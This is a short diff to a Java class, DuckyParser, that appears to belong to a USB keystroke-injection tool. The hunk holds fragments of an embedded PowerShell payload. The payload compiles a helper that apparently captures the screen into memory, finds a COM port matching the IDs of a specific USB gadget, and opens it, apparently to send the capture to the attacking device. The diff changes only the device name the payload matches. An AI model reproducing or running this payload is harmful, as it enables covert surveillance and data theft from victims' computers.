@@ -40,7 +40,7 @@ public final class DuckyParser {
           + "d.Save(m,c,p);return m.ToArray();}}}}}'; "
           + "if(-not('H' -as [type])){Add-Type -TypeDefinition $src -ReferencedAssemblies System.Drawing,System.Windows.Forms}; "
           + "$null=[H]::F(2,2,50); "
-          + "$id=@(gwmi Win32_PnPEntity|?{$_.DeviceID -match 'VID_1D50.PID_601[89]|VID_0525.PID_A4A7' -or $_.Caption -match 'Stryker'}|"
+          + "$id=@(gwmi Win32_PnPEntity|?{$_.DeviceID -match 'VID_1D50.PID_601[89]|VID_0525.PID_A4A7' -or $_.Caption -match 'Astro'}|"
           + "%{[regex]::Match($_.Caption,'COM\\d+').Value}|?{$_})[0]; "
           + "if(-not $id){return}; "
           + "$p=[System.IO.Ports.SerialPort]::new($id,115200,'None',8,'One'); "
